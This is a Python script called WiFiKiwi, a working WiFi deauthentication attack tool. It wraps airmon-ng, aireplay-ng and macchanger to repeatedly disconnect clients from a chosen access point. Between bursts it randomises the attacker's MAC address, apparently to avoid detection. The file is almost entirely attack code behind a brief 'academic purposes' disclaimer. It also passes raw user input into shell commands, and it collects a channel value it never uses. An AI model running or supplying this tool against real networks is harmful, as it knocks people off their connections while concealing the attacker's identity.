#!/usr/bin/env python3

import os
import time
import subprocess

# ASCII banner
print("""
 


                                                                                             
          

                                               
                                               
           .---.                               
          /. ./|   ,--,      .--.,    ,--,     
      .--'.  ' ; ,--.'|    ,--.'  \ ,--.'|     
     /__./ \ : | |  |,     |  | /\/ |  |,      
 .--'.  '   \' . `--'_     :  : :   `--'_      
/___/ \ |    ' ' ,' ,'|    :  | |-, ,' ,'|     
;   \  \;      : '  | |    |  : :/| '  | |     
 \   ;  `      | |  | :    |  |  .' |  | :     
  .   \    .\  ; '  : |__  '  : '   '  : |__   
   \   \   ' \ | |  | '.'| |  | |   |  | '.'|  
    :   '  |--"  ;  :    ; |  : \   ;  :    ;  
     \   \ ;     |  ,   /  |  |,'   |  ,   /   
      '---"       ---`-'   `--'      ---`-'    
                                               
                                               
       ,--.                                    
   ,--/  /|                                    
,---,': / '   ,--,                     ,--,    
:   : '/ /  ,--.'|             .---. ,--.'|    
|   '   ,   |  |,             /. ./| |  |,     
'   |  /    `--'_          .-'-. ' | `--'_     
|   ;  ;    ,' ,'|        /___/ \: | ,' ,'|    
:   '   \   '  | |     .-'.. '   ' . '  | |    
|   |    '  |  | :    /___/ \:     ' |  | :    
'   : |.  \ '  : |__  .   \  ' .\    '  : |__  
|   | '_\.' |  | '.'|  \   \   ' \ | |  | '.'| 
'   : |     ;  :    ;   \   \  |--"  ;  :    ; 
;   |,'     |  ,   /     \   \ |     |  ,   /  
'---'        ---`-'       '---"       ---`-'   
                                               





 WiFiKiwi - WiFi Deauthentication tool
 By - jaknitss

 DISCLAIMER: This tool is intended for academic purposes and for
 use on networks and devices for which you have explicit permission.
 Misuse may lead to legal consequences, loss of connectivity, and/or
 detection by network security systems.
""")

def choose_interface():
    """Let the user choose the wireless interface."""
    print("Listing Wireless Interfaces...")
    os.system('iwconfig 2>/dev/null | grep "^\w"')
    iface = input("Enter the interface you want to use (e.g., wlan0): ")
    return iface

def enable_monitor_mode(interface):
    """Enable monitor mode on the chosen interface."""
    print(f"Enabling monitor mode on {interface}...")
    os.system(f"airmon-ng start {interface}")
    return f"{interface}mon"

def get_target_info():
    """Get BSSID and channel of target AP."""
    bssid = input("Enter the BSSID of the target AP: ")
    channel = input("Enter the channel of the target AP: ")
    return bssid, channel

def deauth_all(interface, bssid, channel, duration):
    """Send deauthentication packets."""
    print("Starting the deauthentication attack...")
    try:
        os.system(f"aireplay-ng --deauth {duration} -a {bssid} --ignore-negative-one {interface}")
    except KeyboardInterrupt:
        print("\nStopping the attack.")

def rotate_mac_address(interface):
    """Rotate the MAC address of the chosen interface."""
    print(f"Changing MAC address of {interface}...")
    os.system(f"macchanger -r {interface}")

def main():
    """Main function to run the script."""
    iface = choose_interface()
    mon_iface = enable_monitor_mode(iface)
    bssid, channel = get_target_info()

    try:
        while True:
            rotate_mac_address(mon_iface)
            deauth_all(mon_iface, bssid, channel, 5)  # Adjust the '5' for different deauth duration
            time.sleep(15)  # Adjust the sleep time as needed
    except KeyboardInterrupt:
        print("Cleaning up...")
        os.system(f"airmon-ng stop {mon_iface}")

if __name__ == "__main__":
    main()
